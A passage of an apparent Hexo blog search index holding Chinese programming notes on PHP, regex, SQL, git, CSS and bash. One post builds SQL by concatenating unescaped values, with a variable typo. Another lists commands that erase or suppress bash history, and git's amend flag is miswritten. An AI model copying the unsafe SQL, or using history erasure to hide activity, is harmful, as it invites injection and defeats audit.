protected $oEndDate = null;\n        protected $oInterval = null;\n\n        public function __construct( DateTime $oStartDate, DateTime $oEndDate, DateInterval $oInterval = null )\n        {\n            $this->oStartDate = $oStartDate;\n            $this->oDate = clone $oStartDate;\n            $this->oEndDate = $oEndDate;\n            $this->oInterval = $oInterval;\n        }\n\n        public function next()\n        {\n            $this->oDate->add($this->oInterval);\n            return $this->oDate;\n        }\n\n        public function current()\n        {\n            return $this->oDate;\n        }\n\n        public function valid()\n        {\n            if ($this->oStartDate > $this->oEndDate)\n            {\n                return $this->oDate >= $this->oEndDate;\n            }\n            return $this->oDate <= $this->oEndDate;\n        }\n\n    }\n\n$oRange = new DateRange(new DateTime(\"2013-10-01\"), new DateTime(\"2013-01-01\"), DateInterval::createFromDateString(\"-1 month\") );\n    foreach ($oRange as $oDate)\n    {\n        echo $oDate->format(\"Y-m-d\") . \"<br />\";\n    }\n```\n\n\n## DatePeriod\n[PHP: DatePeriod - Manual](http://php.net/DatePeriod)裡面的Traversable\n可以用foreach，不過php裡面沒寫interface function讓我有點疑惑???\n\n感覺有很多東西可以寫，先筆記紀錄\n\n參考來源:\n* [PHP - Loop Between Two Dates - TecAdmin.net](https://tecadmin.net/php-loop-between-two-dates/)\n* [PHP: DatePeriod - Manual](http://php.net/DatePeriod)\n* [I have 2 dates in PHP, how can I run a foreach loop to go through all of those days? - Stack Overflow](https://stackoverflow.com/questions/3207749/i-have-2-dates-in-php-how-can-i-run-a-foreach-loop-to-go-through-all-of-those-d)\n","tags":["date"],"categories":["PHP"]},{"title":"PC實用錄制成GIF工具 - ScreenToGif","url":"%2Fblog%2F2018%2F08%2F05%2FPC%E5%AF%A6%E7%94%A8%E9%8C%84%E5%88%B6%E6%88%90GIF%E5%B7%A5%E5%85%B7-ScreenToGif%2F","content":"\n最近從logdown轉道github這邊\n沒有圖片限制的問題\n覺得用點動態圖片會比較好說明\n有專門找一下實用錄製GIF工具\n\n<!--more-->\n\n\n> .錄屏工具，Mac推薦用GIPHY的，windows系統推薦用Honeycam和Gifcam。\n[推薦好用的錄製屏幕成Gif的軟件？ - 知乎](https://www.zhihu.com/question/47403612)\n\n裡面我有用過Gifcam\n不過我覺得沒有很好用\n\n\nScreenToGif  功能非常多\n不過我也只用最簡單錄製功能\n\n由於太好用了，我只需要紀錄[推薦好用的錄製屏幕成Gif的軟件？ - 知乎](https://www.zhihu.com/question/47403612)\n之前那篇文章沒有寫ScreenToGif，我之前只是先記錄一下這邊能寫的套件\n某天進入發現有ScreenToGif就抓下來使用，發現真的很好用\n還是免安裝\n有截圖的需要的人可以用用看","tags":["gif"],"categories":["實用工具"]},{"title":"hexo裝上搜尋功能(local search)","url":"%2Fblog%2F2018%2F08%2F05%2Fhexo_search%2F","content":"\n最近文章越來越多了\n應該是時候加入收尋功能\n有時找新文章真的太麻煩了\n雖然很簡單還是筆記一下\n\n<!--more-->\n\n其實很簡單\n簡單紀錄一下\n\n1. 在hexo站點目錄下執行`npm install hexo-generator-searchdb --save`\n2. Next主題config.yml設置\n```\n# Local search\nlocal_search:\n  enable: true\n```\n基本上這樣就可以了\n\n\n##遇到奇怪錯誤問題\n怎麼點搜尋一直轉圈圈\n\n{% asset_img error.gif hexo_search不能搜尋 %}\n\nXML解析錯誤\n```\n  <entry>\n    <title><![CDATA[Android手機電源鍵壞掉，開機方法]]></title>\n    <url>%2Fblog%2F2018%2F05%2F19%2FAndroid%E6%89%8B%E6%A9%9F%E9%9B%BB%E6%BA%90%E9%8D%B5%E5%A3%9E%E6%8E%89%EF%BC%8C%E9%96%8B%E6%A9%9F%E6%96%B9%E6%B3%95%2F</url>\n    <content type=\"text\"><![CDATA[最近紅米NOTE3電源鍵壞了很久，但是平常可以指紋辨識解鎖有幾次不小心關機，但是強按還是有辦法開機但今天不行了….，剛好買新機想備份LINE，但是無法開機我Google尋了很多方法最終採取fastboot開機法 小米手机电源键坏了怎么办？怎么开机啊？安卓手机手机学院_脚本之家這一篇使用結果沒用 FastBoot 紅米NOTE3 進入方法 音量键- + 电源键 3秒但是…，電源鍵壞掉…無法使用不過可以插電源線充電插入時，按下音量鍵-可以進入fastboot模式 最後，[Linux] fastboot 用法學習歸納 - 代碼家1234sudo add-apt-repository ppa:nilarimogard/webupd8### 我沒有執行上面，發現內鍵可以安裝sudo apt-get updatesudo apt-get install android-tools-adb android-tools-fastboot 安裝FastBoot進入root，fastboot reboot你的手機就會重新開機 愉悅~~~ 手機設定畫面，第二章圖可以設定自動撥放 https://developers.google.com/web/updates/2017/09/autoplay-policy-changes\bhttps://times.hinet.net/news/21737359 [Linux] fastboot 用法學習歸納 - 代碼家adb &amp; fastboot 常用指令 – HTC Flash Zone]]></content>\n      <categories>\n        <category>Android</category>\n      </categories>\n      <tags>\n        <tag>Android</tag>\n      </tags>\n  </entry>\n```\n我猜是我的文章有跟xml衝突到\n\n最後github issue看到[关于文章里有非 utf-8 格式的字符时，搜索会卡住 · Issue #30 · wzpan/hexo-generator-search](https://github.com/wzpan/hexo-generator-search/issues/30)\n改成JSON格式就能解決了\n\n在hexo專案裡面config.yml(非主題裡面)\n```\n# search\n## [第三方服务集成 - NexT 使用文档](http://theme-next.iissnan.com/third-party-services.html#local-search)\nsearch:\n  path: search.json\n  field: post\n  format: html\n  limit: 10000\n```\n\n最後無聊逛到[| 牧之](http://muyunyun.cn/about/)\n網站裡面有一隻貓\n是用**hexo-helper-live2d**\n[hexo live2d插件 2.0 ! | 幻想帖](https://huaji8.top/post/live2d-plugin-2.0/)\n[EYHN/hexo-helper-live2d: Add the Sseexxyyy live2d to your hexo!](https://github.com/EYHN/hexo-helper-live2d)\n先記錄一下\n\n\n參考來源:\n[Hexo博客添加搜索功能 | IT范儿](http://www.itfanr.cc/2017/10/27/add-search-function-to-hexo-blog/)\n[第三方服务集成 - NexT 使用文档](http://theme-next.iissnan.com/third-party-services.html#local-search)","tags":["plugin"],"categories":["hexo"]},{"title":"git修改最後一個commit(修改檔案)","url":"%2Fblog%2F2018%2F07%2F19%2F%E4%BF%AE%E6%94%B9%E6%9C%80%E5%BE%8C%E4%B8%80%E5%80%8Bcommit-%E4%BF%AE%E6%94%B9%E6%AA%94%E6%A1%88%2F","content":"\n`git commit -amend`可修改對上一個commit檔案\ngit add `file`\n`git commit -amend `\n假如說明要變動可下\n`git commit -amend 'Hello World'`\n\n\n之前沒注意到git commit -amend可以對最後一個commit做修正\n以為只能對commit 說明做修改\n筆記筆記\n\n不知道會不會對已經push repo有沒有影響\n改天再實驗一下\n\n\n[1. Commit --amend【教學3 改寫提交】 | 連猴子都能懂的Git入門指南 | 貝格樂（Backlog）](https://backlog.com/git-tutorial/tw/stepup/stepup7_1.html)","tags":["amend"],"categories":["Git"]},{"title":"mysql COALESCE 取代null值好方法","url":"%2Fblog%2F2018%2F07%2F19%2Fmysql-COALESCE-%E5%8F%96%E4%BB%A3null%E5%80%BC%E5%A5%BD%E6%96%B9%E6%B3%95%2F","content":"\n之前前公司有用db2 value，現在用MySQL，找不太到類似與法\n不過在IBM文件看到[IBM Knowledge Center - VALUE](https://www.ibm.com/support/knowledgecenter/en/SSEPEK_11.0.0/sqlref/src/tpc/db2z_bif_value.html)這語法類似COALESCE\n這麼實用的東西，當然不能忘記XD\n<!--more-->\n\nvalue(xxx,ooo)\n假如xxx是null就帶入後面的值\n\nCOALESCE(xxx,ooo,zzz,fff,...)\n同上面一樣方法，xxx為null的話，判斷下一個(ooo)是不是為null，ooo為null再繼續判斷下去\n\ndb2 value(xx,ooo)  & COALESCE\n\n參考來源:\n[德瑞克：SQL Server 學習筆記: SQL Server：認識 COALESCE() 函數](http://sharedderrick.blogspot.com/2012/06/t-sql-coalesce.html)\n[IBM Knowledge Center - VALUE](https://www.ibm.com/support/knowledgecenter/en/SSEPEK_11.0.0/sqlref/src/tpc/db2z_bif_value.html)\n","tags":["coalesce"],"categories":["MySQL"]},{"title":"phpfmt把true,false,null存檔變大寫(違反psr2)，解出/打包phar","url":"%2Fblog%2F2018%2F07%2F18%2Fphpfmt%E6%8A%8Atrue-false-null%E5%AD%98%E6%AA%94%E8%AE%8A%E5%A4%A7%E5%AF%AB-%E9%81%95%E5%8F%8Dpsr2-%EF%BC%8C%E8%A7%A3%E5%87%BA-%E6%89%93%E5%8C%85phar%2F","content":"\n由於目前公司開發團隊，有自訂PHP程式風格\n但是規則跟PSR規則不太一樣\n其中一個就是要true,false要大寫(drupal規範好像是要大寫)\n平常我也都小寫orz\n不知道當初訂製這個規則是不是有開發過drupal\n最近使用phpfmt一直在找解決這個問題(常常忘記大寫orz)\n最後研究出來，當然一定要筆記一下\n有需要可能可以參考這篇\n應該沒有什麼人需要吧 呵呵\n\n<!--more-->\n\n找出phpfmt路徑\n`%USERPROFILE%\\.vscode\\extensions`\n\n進入phpfmt路徑(可搜尋phpfmt)\n裡面有`fmt.phar`檔案\n\nphar是類似php多隻程式打包成一個檔案，有一點跟jar一樣\n但怎麼不能用zip打開orz\n不過說真的打包過程很麻煩樣子\ncomposer也不能直接做phar(可能沒有找到)\n最後有Google到方法\n\n\n### 解出phar\n[php归档格式：phar文件详解（创建、使用、解包还原提取） - CSDN博客](https://blog.csdn.net/u011474028/article/details/54973571)\n```php\n$phar = new Phar('fmt.phar');\n$phar->extractTo('fmt'); //提取一份原項目文件\n$phar->convertToData(Phar::ZIP); //另外再提取一份，和上行二選一即可\n```\n\n### 打包phar\n參考[苗栗縣教育處資訊教育中心 - 打包多個php檔案變成phar執行檔](https://it.mlc.edu.tw/index.php/2012-03-24-08-48-16/2012-03-24-08-49-32/27-php/54-php-phar)\n\n```php\n<?php\n$p=new Phar('./fmt.phar');\n$p->setStub(file_get_contents('fmt.stub.php'));//入口網頁\n$p->buildFromDirectory('.');//不確定要有\n```\n\n\n### 無法解出phar問題\n\n因為在公司不知道為什麼?phar一直失敗\n* 注意資料夾是不是唯讀\n* 確定php.ini有沒有把phar.readonly = Off\n* phar.readonly前面有沒有把; del掉(我就是卡在這邊orz)\n\n要怎麼知道command line 的php.ini是吃哪裡?預設應該是php目錄裡面（PS:phpfmt是對應OS環境變數path裡面php)\n[easyphp - How to find the php.ini file used by the command line? - Stack Overflow](https://stackoverflow.com/questions/2750580/how-to-find-the-php-ini-file-used-by-the-command-line)\n`php -i`可以看裡面設定內容，可以看到phar.readonly有沒有關閉才能正確執行\n\nphar參考連結\n* [akalongman/fmt: Tooling for PHP - testing, code coverage and formatting](https://github.com/akalongman/fmt)\n* [如何解包还原一个phar文件](https://newsn.net/say/php-phar-extract.html)\n* [PHP的学习--使用phar打包 - 疯狂的原始人 - 博客园](http://www.cnblogs.com/CraryPrimitiveMan/p/6158196.html)\n* [苗栗縣教育處資訊教育中心 - 打包多個php檔案變成phar執行檔](https://it.mlc.edu.tw/index.php/2012-03-24-08-48-16/2012-03-24-08-49-32/27-php/54-php-phar)\n* [easyphp - How to find the php.ini file used by the command line? - Stack Overflow](https://stackoverflow.com/questions/2750580/how-to-find-the-php-ini-file-used-by-the-command-line)\n* [Phar建立與使用 | ScarShow | 刀疤說](https://scar.tw/article/2013/01/09/php-phar-create-and-use/)\n\n修改完成\n{% asset_img fmt.gif vscode結果  %}\n\n\n最後修改完php\n做上面打包動作\n覆蓋fmt.phar，即可完成\nfmt_smt.php修改部分\n```php\n            if ('true' === $lcText || 'false' === $lcText || 'null' === $lcText) {\n                $lcText = strtoupper($text);\n            }\n\n\t\t\tif (\n\t\t\t\t(\n\t\t\t\t\t('TRUE' === $lcText || 'FALSE' === $lcText || 'NULL' === $lcText) &&\n\t\t\t\t\t!$this->leftUsefulTokenIs([\n```\n\n很麻煩的話，可以下載我改過的:D\n打包完的phar檔案需要的話可以自取\n{% asset_link fmt.phar fmt.phar下載 %}\n\n最後設定檔下面可以拿掉\n```\n  \"phpfmt.psr2\": false,\n```\n\n不過psr2除了小寫，不知道還有做什麼事情= =a","tags":["phar"],"categories":["實用工具"]},{"title":"vscode 套件調整PHP code style 使用記錄","url":"%2Fblog%2F2018%2F07%2F18%2Fvscode-%E5%A5%97%E4%BB%B6%E8%AA%BF%E6%95%B4PHP-code-style-%E4%BD%BF%E7%94%A8%E8%A8%98%E9%8C%84%2F","content":" * phpfmt\n     * [sublime text3 phpfmt插件使用 - eerTime](https://www.eertime.com/archives/86.html)\n * vscode-php-cs-fixer\n     * [在 vs code 使用 php cs fixer 進行 coding style 的格式修正 | Codefun](http://codefun.tw/2017/10/23/2017102302-vscode-extension-php-cs-fixer/)\n * php-cs-fixer\n     * [使用 PHP-CS-Fixer 自动规范化你的 PHP 代码 - dingdayu的个人空间 - 开源中国](https://my.oschina.net/dingdayu/blog/792497)\n \n不知道為什麼裝phpfmt，我vscode不用設定什麼東西就能跑了\n後來決定用這個XD\n設定方式也很方便\n\n<!--more-->\n\n沒試用的套件\n * sample-vscode-php-cs-fixer\n * PHP Formatter\n\n[vscode 中使用php-cs-fixer和PHP Formatter 插件规范化PHP代码 - HTL - 博客园](https://www.cnblogs.com/huangtailang/p/6604124.html)\n\n可先在作業系統環境path加入php執形資料夾\n下載php解壓縮出來，設定作業環境的path\n\n\n公司PHP設定\n* TRUE、FALSE、NULL 要大寫  // psr2檢查要關掉\n* if class switch 需要換行  // AllmanStyleBraces\n```\n  \"phpfmt.passes\": [\"AllmanStyleBraces\"],\n  \"phpfmt.psr2\": false,\n  \"[php]\": {\n    \"editor.formatOnSave\": true\n  }\n```\n`\"editor.formatOnSave\": true`\nvscode`檔案編輯頁面`還原git好像會有問題......\n但影響不大......\n~~這篇好像沒有寫什麼重點   呵呵= =|||~~\n","tags":["PSR"],"categories":["實用工具"]},{"title":"php字串\"符號帶變數用法","url":"%2Fblog%2F2018%2F07%2F04%2Fphp%E5%AD%97%E4%B8%B2%E7%AC%A6%E8%99%9F%E5%B8%B6%E8%AE%8A%E6%95%B8%E7%94%A8%E6%B3%95%2F","content":"\n\n高職我第一翻開的書是PHP\n從以前我就知道'&\"在PHP的差別\n但我沒有深入了解.....\n今天踩到一個雷\n`A PHP Error was encountered Severity: Notice Message: Undefined variable: date`\n我發現我字串這樣寫\n```php\n<?php\n$date = date(\"Y-m-d\");\necho \"$date之後要做什麼\";\n```\n其實後來發現$date後面要空白，不能連在一起\n同一個雷，不希望一直踩到\n就筆記筆記吧\n\n<!--more-->\n\n下面是官網範例，簡單講\"\"包起來遇到$就會抓取變數\n不管是陣列還是物件都可以抓到\n但注意$var後面字串要分格空白\n**當然也可以用{}包起來，但要相連在一起**\n```php\n<?php\n// 顯示所有錯誤\nerror_reporting(E_ALL);\n\n$great = 'fantastic';\n\n// 無效，輸出: This is { fantastic}\necho \"This is { $great}\";\n\n// 有效，輸出： This is fantastic\necho \"This is {$great}\";\necho \"This is ${great}\";\n\n// 有效\necho \"This square is {$square->width}00 centimeters broad.\"; \n\n$juices = array(\"apple\", \"orange\", \"koolaid1\" => \"purple\");\n\necho \"He drank some $juices[0] juice.\".PHP_EOL;\necho \"He drank some $juices[1] juice.\".PHP_EOL;\necho \"He drank some juice made of $juice[0]s.\".PHP_EOL; // Won't work\necho \"He drank some $juices[koolaid1] juice.\".PHP_EOL;\n\nclass people {\n    public $john = \"John Smith\";\n    public $jane = \"Jane Smith\";\n    public $robert = \"Robert Paulsen\";\n    \n    public $smith = \"Smith\";\n}\n\n$people = new people();\n\necho \"$people->john drank some $juices[0] juice.\".PHP_EOL;\necho \"$people->john then said hello to $people->jane.\".PHP_EOL;\necho \"$people->john's wife greeted $people->robert.\".PHP_EOL;\necho \"$people->robert greeted the two $people->smiths.\"; // Won't work  多加s   害我一直再看哪裡有問題orz\n\n/*\n * \n * 下面特殊狀況\n * \n */ \n //有效\necho \"This square is {$square->width}00 centimeters broad.\"; \n\n// 有效，只有通過花括號語法才能正確解析帶引號的鍵名\n// 這個雷我可能還不知道\n\necho \"This works: {$arr['key']}\";\n\n// 有效\necho \"This works: {$arr[4][3]}\";\n\n//沒有帶key的字串可以不用{} ex:$arr[4][3]\n\n// 這是錯誤的表達式，因為就像 $foo[bar] 的格式在字符串以外也是錯的一樣。\n// 換句話說，只有在 PHP 能找到常量 foo 的前提下才會正常工作；這裡會產生一個\n// E_NOTICE (undefined constant) 級別的錯誤。\necho \"This is wrong: {$arr[foo][3]}\"; \n\n// 有效，當在字符串中使用多重數組時，一定要用括號將它括起來\necho \"This works: {$arr['foo'][3]}\";\n\n// 有效\necho \"This works: \" . $arr['foo'][3];\n\necho \"This works too: {$obj->values[3]->name}\";\n\n/**\n * 下面很神奇，可以用function return 字串出來，但不能直接用function回傳字串\n * 感覺不是很實用...\n */\n\necho \"This is the value of the var named $name: {${$name}}\";\n\necho \"This is the value of the var named by the return value of getName(): {${getName()}}\";\n\necho \"This is the value of the var named by the return value of \\$object->getName(): {${$object->getName()}}\";\n\n// 無效，輸出： This is the return value of getName(): {getName()}\necho \"This is the return value of getName(): {getName()}\";\n```\n\n\n> 函數、方法、靜態類變量和類常量只有在 PHP 5 以後才可在 {$} 中使用。然而，只有在該字符串被定義的命名空間中才可以將其值作為變量名來訪問。只單一使用花括號 ({}) 無法處理從函數或方法的返回值或者類常量以及類靜態變量的值。\n```php\n<?php\n// 顯示所有錯誤\nerror_reporting(E_ALL);\n\nclass beers {\n    const softdrink = 'rootbeer';\n    public static $ale = 'ipa';\n}\n\n$rootbeer = 'A & W';\n$ipa = 'Alexander Keith\\'s';\n\n// 有效，輸出： I'd like an A & W\necho \"I'd like an {${beers::softdrink}}\\n\";\n\n// 也有效，輸出： I'd like an Alexander Keith's\necho \"I'd like an {${beers::$ale}}\\n\";\n\n?>\n```\n\n以前我記得PHP有一個HEREDOC\n但剛剛看文件5.3以後有一個NOWDOC\n\n heredoc 語法結構\nnowdoc 語法結構（自 PHP 5.3.0 起） \n\nheredoc可以用$var 帶變數\n但是nowdoc不會帶入$var變數\nnowdoc用在XML會比較不會有問題\n\n官網範例\n```php\n\n<?php\n$str = <<<'EOD'\nExample of string\nspanning multiple lines\nusing nowdoc syntax.\nEOD;\n\n/* 含有变量的更复杂的示例 */\nclass foo\n{\n    public $foo;\n    public $bar;\n\n    function foo()\n    {\n        $this->foo = 'Foo';\n        $this->bar = array('Bar1', 'Bar2', 'Bar3');\n    }\n}\n\n$foo = new foo();\n$name = 'MyName';\n\necho <<<'EOT'\nMy name is \"$name\". I am printing some $foo->foo.\nNow, I am printing some {$foo->bar[1]}.\nThis should not print a capital 'A': \\x41\nEOT;\n?>\n\n```\n\n\n### echo boolean 沒有東西原因\n\n[PHP: String 字符串 - Manual](http://php.net/manual/zh/language.types.string.php#language.types.string.casting)\n\n之前不知道為什麼echo boolean沒有出來東西\n現在知道為什麼了\n\n\n> 一個布爾值 boolean 的 TRUE 被轉換成 string 的 \"1\"。Boolean 的 FALSE 被轉換成 \"\"（空字符串）。這種轉換可以在 boolean 和 string 之間相互進行。\n一個整數 integer 或浮點數 float 被轉換為數字的字面樣式的 string（包括 float 中的指數部分）。使用指數計數法的浮點數（4.1E+6\n> 數組 array 總是轉換成字符串 \"Array\"，因此，echo 和 print 無法顯示出該數組的內容。要顯示某個單元，可以用 echo $arr['foo'] 這種結構。要顯示整個數組內容見下文。\n在 PHP 4 中對象 object 總是被轉換成字符串 \"Object\"，如果為了調試原因需要打印出對象的值，請繼續閱讀下文。為了得到對象的類的名稱，可以用 get_class() 函數。自 PHP 5 起，適當時可以用 __toString 方法。\n資源 resource 總會被轉變成 \"Resource id #1\" 這種結構的字符串，其中的 1 是 PHP 在運行時分配給該 resource 的唯一值。不要依賴此結構，可能會有變更。要得到一個 resource 的類型，可以用函數 get_resource_type()。\nNULL 總是被轉變成空字符串。\n如上面所說的，直接把 array，object 或 resource 轉換成 string 不會得到除了其類型之外的任何有用信息。可以使用函數 print_r() 和 var_dump() 列出這些類型的內容。 \n\n\n[PHP: String 字符串 - Manual](http://php.net/manual/zh/language.types.string.php#language.types.string.casting)\n\n看來有空來補這個筆記\n[PHP: 類型轉換的判別 - Manual](http://php.net/manual/zh/language.types.type-juggling.php)\n\n還發現PHP String有長度限制`2GB`\n\n結果原本要記錄一個東西，越記越多XD\n發現很多書都沒有教很清楚orz\n\n\n\n\n","tags":["NOWDOC"],"categories":["PHP"]},{"title":"Regex 排除單字方法(Lookarounds)","url":"%2Fblog%2F2018%2F07%2F03%2FRegex-%E6%8E%92%E9%99%A4%E5%96%AE%E5%AD%97%E6%96%B9%E6%B3%95-Lookarounds%2F","content":"\n這次專案有用到 email 學生任證，有想一個用 email 方法\n但這次需求要把一些教育信箱排除在外...\n查了一下 regex 好像沒法對特定單字做\n不過我有實做一個方法(不知道有沒有漏洞)\n\n<!--more-->\n\n### a(?!xxx)\n\n不會抓 axxx，但會抓 ax,axx,aoxxx 的`a`\n\n### a(?=xxx)\n\n會抓 axxx 的`a`\n\n### (?:xxx)\n\n**2019-12-08**\n這邊 xxx 一樣是連詞\n```\n^I like (?:dogs|penguins), but not (?:lions|tigers).$\n```\n[Regular Expression for Or | \"|\" Regex | Regular Expression I | OCPsoft](https://www.ocpsoft.org/tutorials/regular-expressions/or-in-regex/?fbclid=IwAR0AWbTPjZKC5bXSqGBfHOTMEqPG5T-K7lmQKs9UWd3yD0Qdmz3y1aUOSvI)\n\n不會算 group\n\n最後再沒有找到資料情況下，有例用上面 3 個想到一個方法\n\n\n\n`@(?!nfu)\\S*edu.tw`\n\n例用`(?!xxx)`跟`\\S`(非空白字符)\n真的太久沒有寫會忘 orz\n我每次都是寫的時候再查\n\n```\n\\s 元字符用于查找空白字符。\n\n空白字符可以是：\n\n    空格符 (space character)\n    制表符 (tab character)\n    回车符 (carriage return character)\n    换行符 (new line character)\n    垂直换行符 (vertical tab character)\n    换页符 (form feed character)\n```\n\nhttp://www.w3school.com.cn/js/jsref_regexp_whitespace.asp\n\n[regex - Regular expression to match a line that doesn't contain a word? - Stack Overflow](https://stackoverflow.com/questions/406230/regular-expression-to-match-a-line-that-doesnt-contain-a-word)\n還有看到這篇，但好像不實用\n\n[Regex Cheat Sheet](http://www.rexegg.com/regex-quickstart.html#lookarounds)看到裡面還有很多不會\n感覺還有更深的東西。有時間再食用。\n\n**2019-07-25**\n\n今天在改 PHP 程式，由於要改一些程式把`xxx_line`去除掉\n但是跟 PHP `__LINE__`衝突\n不過後來找到正規化去除`(?<!_)_line`\n\n[無聊技術研究: RegExp 應用： lookahead , lookbehind](http://darkk6.blogspot.com/2017/03/regexp-lookahead-lookbehind.html) {% asset_link web1.png 備份圖 %}\n\n裡面有提到`lookahead`(往前看)\n\n    Positive lookahead ： a(?=Y)\n    Negative lookahead ： a(?!Y)\n\n剛我這個例子是用`lookbehind`(往後看)\n之前沒有記錄到\n\nPositive lookbehind ： (?<=Y)a\nNegative lookbehind： (?<!Y)a\n\n參考來源：\n\n- [regex – 排除单词/字符串的正则表达式 - 代码日志](https://codeday.me/bug/20170511/14935.html)\n- [regex - Regular expression to match a line that doesn't contain a word? - Stack Overflow](https://stackoverflow.com/questions/406230/regular-expression-to-match-a-line-that-doesnt-contain-a-word)\n- [Match string not containing string - Regex Tester/Debugger](https://www.regextester.com/15)\n- [正则的扩展 - ECMAScript 6 入门](http://es6.ruanyifeng.com/#docs/regex)\n\n\n\n\n[Regex 群組與環顧 Groups & Lookaround - 正規表示法教學 Regular Expression Tutorial](https://www.fooish.com/regex-regular-expression/groups-lookaround.html) {% asset_link web2.png 備份圖 %}","tags":["lookarounds"],"categories":["Regex"]},{"title":"SQL not in & in 拆開寫法","url":"%2Fblog%2F2018%2F07%2F03%2FSQL-not-in-in-%E6%8B%86%E9%96%8B%E5%AF%AB%E6%B3%95%2F","content":"\n今天思緒有點短路，做SQL用程式組兩個`NOT IN`\n~~竟然用` OR `，可能覺得跟IN一樣~~\n但事後想想應該是要用`AND`\n不可能有一個要`NOT IN`另外一個不用`NOT IN`\n\n好了這個雷紀錄一下，不要再踩到\n\n* IN(xxx,ooo)  => IN (xxx) or  IN(ooo)=\n* NOT IN(xxx,ooo)  => NOT IN (xxx) AND  NOT IN(ooo)","tags":["NOT IN"],"categories":["SQL"]},{"title":"PHP 產生動態sql技巧(IN)","url":"%2Fblog%2F2018%2F07%2F03%2FPHP-%E7%94%A2%E7%94%9F%E5%8B%95%E6%85%8Bsql%E6%8A%80%E5%B7%A7-IN%2F","content":"\n由於mysql處理IN效能不是很好，大量資料做的時候速度會很慢\n有用PHP程式動態產生SQL，今天有看到很好用的寫法\n筆記一下\n\n<!--more-->\n\nNOTE主要用substr減少最後一個`,`\n再放入SQL變數裡面去\n寫起來很簡單\n\n```php\n<?\n$filter = $list = '';    \n\n        if(is_array($array_uid)){\n            foreach($array_uid as $user_val){\n                $list .= \"'\".$user_val['uid'].\"'\";\n                $list .= \",\";\n            }\n            $list = substr($list, 0, -1);\n            $fliter = \" AND u.uid NOT IN (\".$list.\") \";\n        }\n\n        $sql = \"select * from xxx where 1=1  $filter \";\n```\n\n\n","tags":["NOT IN"],"categories":["PHP"]},{"title":"flex margin-right:auto 右邊元素靠右(參考bootstrap4 navbar)","url":"%2Fblog%2F2018%2F07%2F02%2Fflex-margin-right-auto-%E5%8F%B3%E9%82%8A%E5%85%83%E7%B4%A0%E9%9D%A0%E5%8F%B3-%E5%8F%83%E8%80%83bootstrap4-navbar%2F","content":"\n今天看到官網Bootstrap 4的Nabars，好奇他的Navbar怎麼排版的\n發現竟然是使用flex去編排，但是搜尋位置竟然可以靠右\n中間空白是怎麼用的??查了一下，發現他有使用margin\n究竟flex和margin碰在一起會產生甚麼化學反應呢?\n讓我們紀錄吧!!!\n\n<!--more-->\n\n在講flex之前，我就有紀錄過margin搭配position可以置中，但其他是有公式的\n>'margin-left' + 'border-left-width' + 'padding-left' + 'width' + 'padding-right' +'border-right-width' + 'margin-right' = width of containing block\n[margin-left: auto;为什么可以使的元素靠右 - SharkU的回答 - SegmentFault 思否](https://segmentfault.com/q/1010000008431088/a-1020000008431730)\n\n>margin-right 不设置的话默认是0，width 定宽之后，margin-left取值为 auto ，自动占据了剩余的全部宽度，具体见 《css权威指南》 P170\n[studyFiles/CSS权威指南（第三版）(jb51.net).pdf at master · threerocks/studyFiles](https://github.com/threerocks/studyFiles/blob/master/%E5%89%8D%E7%AB%AF/CSS%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97%EF%BC%88%E7%AC%AC%E4%B8%89%E7%89%88%EF%BC%89(jb51.net).pdf)\n\n\nbootstrap 4 是用 左邊最後一個元素加上`margin-right:auto` 右邊會靠右\n當然反過來也可以在左邊search 加上`margin-left:auto`\n\n在簡書看到我想知道的東西(備份:https://screenshots.firefox.com/0gK3HJq4OS6WkyCk/www.jianshu.com)\n>Flex布局算法中对auto margins的对齐原理有如下解释，原文是英文，我尽量准确翻译：\n    在主轴（main axis）方向\n        如剩余空间为正数，则剩余空间会被平均分配在拥有主轴方向auto margin(s)的flex元素之间。\n        如剩余空间为负数，则将主轴方向的auto margin(s)设定为‘0’。\n\n>看过这些例图，auto margins的使用方法应该不会忘了吧。最后再来提个醒儿：\n   * auto margins仅针对当前的flex item，对其子元素无效。\n   * 在计算flex-bases与flexible lengths （main size与cross size）时，auto margins取值为0。\n   * auto margins优先于justify-content与align-self。由于相应方向上的剩余空间已分配给auto margins，justify-content与align-self将无效。\n   * auto margins对溢出的（overflowing）flex item无效。\n\n作者：蜂蜜柚子茶\n链接：https://www.jianshu.com/p/beeb93a76830\n來源：简书\n\n沒想到還能這樣用，筆記筆記...\n","tags":["margin"],"categories":["CSS"]},{"title":"不留這次Linux bash 歷史記錄的方法","url":"%2Fblog%2F2018%2F07%2F02%2F%E4%B8%8D%E7%95%99%E9%80%99%E6%AC%A1Linux-bash-%E6%AD%B7%E5%8F%B2%E8%A8%98%E9%8C%84%E7%9A%84%E6%96%B9%E6%B3%95%2F","content":"\n有時因為要測試指令\n會大量留下不能用的指令到history上面\n今天就搜尋一下，發現[XYZ的筆記本: Linux Bash 刪除 history 指令操作歷史紀錄](https://xyz.cinc.biz/2017/08/linux-bash-history-clear.html)\n有講要怎麼清除，有測試成功!!!\n\n<!--more-->\n\n** 以下擷取[XYZ的筆記本: Linux Bash 刪除 history 指令操作歷史紀錄](https://xyz.cinc.biz/2017/08/linux-bash-history-clear.html) **\n>只刪除這次登入後的操作紀錄：\n方法一：清空 HISTFILE 變數內容，則登出時，不會將本次操作紀錄儲存到 HISTFILE 設定的檔案。\n    # unset HISTFILE\n方法二：將 HISTSIZE 設為0，下「history」指令時，也不會列出指令(記憶體中沒存放指令紀錄?)，則登出時，不會更新記錄檔內容(?)。\n(註：參考資料是寫會刪除全部紀錄，但我測試是只有不會儲存本次操作紀錄)\n    # HISTSIZE=0\n 方法三：強制刪除本次登入 Bash 的 PID，則本次操作紀錄，不會儲存到記錄檔。\n    # kill -9 $$\n\n感覺最實用是方法3`kill -9 $$`\n\n清除所有history發法\n```\n# history -c\n# history -w\n```\n詳細可以去看一下鳥哥\n[鳥哥的 Linux 私房菜 -- 第十章、認識與學習BASH](http://linux.vbird.org/linux_basic/0320bash.php#history)\n\n另外還有HISTCONTROL方法\n[Linux Bash環境下，輸入指令不留痕跡的作法 :: 哇哇3C日誌](https://ez3c.tw/1717)\n\n\n今天還看到HISTORY可以用Ctrl+R 找過去打的指令\n[Linux 指令歷史紀錄（History）的操作教學與範例 - G. T. Wang](https://blog.gtwang.org/linux/mastering-linux-command-line-history/)\n\n參考來源:\n[XYZ的筆記本: Linux Bash 刪除 history 指令操作歷史紀錄](https://xyz.cinc.biz/2017/08/linux-bash-history-clear.html)\n[鳥哥的 Linux 私房菜 -- 第十章、認識與學習BASH](http://linux.vbird.org/linux_basic/0320bash.php#history)\n[Linux Bash環境下，輸入指令不留痕跡的作法 :: 